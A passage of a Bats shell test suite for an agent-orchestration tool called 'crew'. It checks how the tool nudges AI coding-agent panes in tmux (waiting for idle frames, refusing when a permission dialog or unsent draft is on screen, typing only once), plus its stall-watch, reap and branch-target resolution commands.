  [ "$(nudge_keys)" = "$(printf '%s\n' 'send-keys -t %9 -l crew inbox "$CREW_WORKER_ID"' 'send-keys -t %9 Enter')" ]
  [ "$(nudge_rows | wc -l)" -eq 1 ]
  [ "$(nudge_rows | jq -r .result)" = accepted ]
  [ "$(nudge_wait_rows | jq -r '"\(.state):\(.result)"' | paste -sd' ')" = "waiting: resolved:accepted" ]
  [ "$(cat "$STUB_DIR/frames/%9.p.n")" -ge 6 ]
}

@test "nudge: --wait still types once when a follow-up msg lands mid-wait" {
  _nudge_setup
  _nudge_directive
  export CREW_NUDGE_WAIT_INTERVAL=5
  _nudge_wait_frames
  cat >"$BATS_TEST_TMPDIR/followup.sh" <<EOS
jq -nc --argjson ts "\$((\$(date +%s) * 1000))" '{ts:\$ts, crew_id:"c1", from:"dispatcher:c1",
  to:"worker:feat/x#s1-1", kind:"msg", body:"follow-up"}' >>"$ndir/events.jsonl"
EOS
  _nudge_wrap_tmux 2 "bash '$BATS_TEST_TMPDIR/followup.sh'"
  CREW_ID=c1 run run_crew nudge nova --wait 60
  [ "$status" -eq 0 ]
  [ "$(bus | jq -c 'select(.kind=="msg")' | wc -l)" -eq 2 ]
  [ "$(nudge_keys | wc -l)" -eq 2 ]
  [ "$(nudge_rows | jq -r .result)" = accepted ]
}

@test "nudge: --wait stops untyped when the lead reads the msg during the wait" {
  _nudge_setup
  _nudge_directive
  export CREW_NUDGE_WAIT_INTERVAL=5
  nudge_frames "$(fx_done_idle)"
  cp "$(fx_meter 2s 1.2k)" "$STUB_DIR/frames/%9.1"
  cp "$(fx_meter 2s 1.2k)" "$STUB_DIR/frames/%9.2"
  _nudge_wrap_tmux 2 "bash '$CREW' inbox 'worker:feat/x#s1-1' c1"
  CREW_ID=c1 run run_crew nudge nova --wait 60
  [ "$status" -eq 0 ]
  [[ "$output" == *"read the msg during the wait"* ]]
  [ -z "$(nudge_keys)" ]
  [ -z "$(nudge_rows)" ]
  [ "$(nudge_wait_rows | jq -r 'select(.state=="resolved") | .result')" = read ]
}

@test "nudge: --wait times out on a lead that stays mid-turn" {
  _nudge_setup
  _nudge_directive
  export CREW_NUDGE_WAIT_INTERVAL=5
  nudge_frames "$(fx_meter 2s 1.2k)"
  CREW_ID=c1 run run_crew nudge nova --wait 10
  [ "$status" -eq 2 ]
  [[ "$output" == *"live turn or no idle input box (waited"* ]]
  [ -z "$(nudge_keys)" ]
  [ -z "$(nudge_rows)" ]
  [ "$(nudge_wait_rows | jq -r 'select(.state=="resolved") | .result')" = timeout ]
}

@test "nudge: --wait refuses non-live-turn frames immediately" {
  _nudge_setup
  _nudge_directive
  export CREW_NUDGE_WAIT_INTERVAL=5
  nudge_frames "$(fx_nudge_draft)"
  cp "$(fx_nudge_draft_colored)" "$STUB_DIR/frames/%9.e"
  CREW_ID=c1 run run_crew nudge nova --wait 60
  _nudge_refused "unsent input in the input box"
  [ -z "$(nudge_wait_rows)" ]
  [ "$(cat "$STUB_DIR/frames/%9.p.n")" -le 1 ]
  while IFS='|' read -r fx reason; do
    nudge_frames "$($fx)"
    CREW_ID=c1 run run_crew nudge nova --wait 60
    _nudge_refused "$reason"
    [ -z "$(nudge_wait_rows)" ]
    [ "$(cat "$STUB_DIR/frames/%9.p.n")" -le 1 ]
  done <<'EOF'
fx_prompt_select|dialog on screen (option-select or workspace trust)
fx_permission_subagent|permission dialog on screen
fx_nudge_fresh|no finished-turn marker above the input box
EOF
}

@test "nudge: --wait refuses a codex lead and a missing msg immediately" {
  _nudge_setup codex codex
  _nudge_directive
  export CREW_NUDGE_WAIT_INTERVAL=5
  nudge_frames "$(fx_done_idle)"
  CREW_ID=c1 run run_crew nudge nova --wait 60
  _nudge_refused "no verified idle lead frame for codex"
  [ -z "$(nudge_wait_rows)" ]
  CREW_ID=c1 run run_crew inbox 'worker:feat/x#s1-1' c1
  CREW_ID=c1 run run_crew nudge nova --wait 60
  _nudge_refused "no unread msg from dispatcher:c1"
}

@test "nudge: --wait stops on a dialog that appears mid-wait" {
  _nudge_setup
  _nudge_directive
  export CREW_NUDGE_WAIT_INTERVAL=5
  nudge_frames "$(fx_prompt_select)"
  cp "$(fx_meter 2s 1.2k)" "$STUB_DIR/frames/%9.1"
  CREW_ID=c1 run run_crew nudge nova --wait 60
  [ "$status" -eq 2 ]
  [[ "$output" == *"dialog on screen"* ]]
  [ -z "$(nudge_keys)" ]
  [ -z "$(nudge_rows)" ]
  [ "$(nudge_wait_rows | jq -r 'select(.state=="resolved") | .result')" = refused ]
}

@test "nudge: --wait two concurrent calls for one lead and msg type once" {
  _nudge_setup
  _nudge_directive
  unset CREW_CLOCK
  export CREW_NUDGE_WAIT_INTERVAL=0.2
  nudge_frames "$(fx_meter 2s 1.2k)"
  d="$BATS_TEST_TMPDIR/conc"
  mkdir -p "$d"
  CREW_ID=c1 run_crew nudge nova --wait 30 >"$d/a" 2>&1 3>&- &
  pa=$!
  for _ in $(seq 100); do
    [ -n "$(nudge_wait_rows)" ] && break
    sleep 0.1
  done
  [ -n "$(nudge_wait_rows)" ]
  CREW_ID=c1 run_crew nudge nova --wait 30 >"$d/b" 2>&1 3>&- &
  pb=$!
  for _ in $(seq 100); do
    grep -q 'nudge joining' "$d/b" && break
    sleep 0.1
  done
  grep -q 'nudge joining' "$d/b"
  cp "$(fx_done_idle)" "$STUB_DIR/frames/%9"
  wait "$pa" || true
  wait "$pb" || true
  [ "$(nudge_keys | grep -c -- '-t %9 -l')" -eq 1 ]
  [ "$(nudge_rows | wc -l)" -eq 1 ]
  grep -q 'nudge unconfirmed' "$d/a"
  grep -q 'nudge joined' "$d/b"
}

@test "nudge: --wait parsing takes only an all-digit SECONDS" {
  _nudge_setup
  _nudge_directive
  nudge_frames "$(fx_done_idle)"
  CREW_ID=c1 run run_crew nudge nova --wait abc
  [ "$status" -eq 1 ]
  [[ "$output" == *"one target only"* ]]
  nudge_frames "$(fx_done_idle)" "$(fx_nudge_typed)" "$(fx_meter 2s 1.2k)"
  CREW_ID=c1 run run_crew nudge --wait nova
  [ "$status" -eq 0 ]
  [ "$(nudge_rows | jq -r .result)" = accepted ]
  seed_msg dispatcher:c1 'worker:feat/x#s1-1' 0
  nudge_frames "$(fx_meter 2s 1.2k)"
  CREW_ID=c1 run run_crew nudge nova --wait 0
  [ "$status" -eq 2 ]
  [[ "$output" == *"(waited 0s)"* ]]
}

@test "stall-watch: keeps the window after a watchdog-posted failed on a static non-claude pane" {
  _release_setup
  seed_raw "worker:feat/x#s1-1" failed "dead: quiet: no output" watchdog "$(($(date +%s) * 1000 + 500))"
  p=$(fx_done_idle)
  stall_sampler "$p"
  CREW_ID=c1 run run_crew stall-watch worker:feat/x#s1-1 --pane %9 --engine codex \
    --grace 0 --interval 1 --window 0 --idle 999 --dead 999 --max-life 5 --release 1
  [ "$status" -eq 0 ]
  run ! grep -q 'kill-window' "$STUB_LOG"
}

@test "reap: harness-injected user turns (task-notification, isMeta) do not count as a human" {
  _human_setup
  export CLAUDE_CONFIG_DIR="$BATS_TEST_TMPDIR/claude"
  tdir="$CLAUDE_CONFIG_DIR/projects/$(printf '%s' "$human_wt" | sed 's/[^A-Za-z0-9]/-/g')"
  mkdir -p "$tdir"
  newer=$(date -u -d '+30 seconds' +%Y-%m-%dT%H:%M:%S.000Z)
  printf '%s\n' \
    "{\"type\":\"user\",\"timestamp\":\"$newer\",\"message\":{\"content\":\"<task-notification>done</task-notification>\"}}" \
    "{\"type\":\"user\",\"isMeta\":true,\"timestamp\":\"$newer\",\"message\":{\"content\":\"Base directory for this skill\"}}" >"$tdir/s.jsonl"
  CREW_ID=c1 run run_crew reap --idle 0 --quiet
  grep -q 'kill-window -t @23' "$STUB_LOG"
}

@test "resolve-target: #N, Linear id, branch, codename and worker id name one branch; ambiguity exits 2" {
  dir="$(git rev-parse --path-format=absolute --git-common-dir)/crew"
  mkdir -p "$dir"
  {
    printf '%s\n' '{"ts":1,"crew_id":"c1","kind":"dispatch","branch":"feat/9-gone","name":"sage","host":"h1"}'
    printf '%s\n' '{"ts":2,"crew_id":"c1","kind":"dispatch","branch":"eng-12-thing","name":"nova","also_closes":["ENG-13"]}'
    printf '%s\n' '{"ts":3,"crew_id":"c1","kind":"dispatch","branch":"fix/10-b","name":"nova"}'
  } >"$dir/events.jsonl"
  for target in '#9' 9 feat/9-gone sage 'worker:feat/9-gone#s1-2'; do
    run run_crew resolve-target "$target"
    [ "$status" -eq 0 ]
    [ "$output" = "$(printf 'feat/9-gone\tsage\th1\tc1')" ]
  done
  run run_crew resolve-target ENG-12
  [ "$status" -eq 0 ]
  [[ "$output" == eng-12-thing* ]]
  run run_crew resolve-target eng-13
  [ "$status" -eq 0 ]
  [[ "$output" == eng-12-thing* ]]
  run run_crew resolve-target nova
  [ "$status" -eq 2 ]
  [[ "$output" == *"ambiguous"*"eng-12-thing"*"fix/10-b"* ]]
  run run_crew resolve-target nobody
  [ "$status" -eq 1 ]
  [[ "$output" == *"no worker matches 'nobody'"* ]]
}
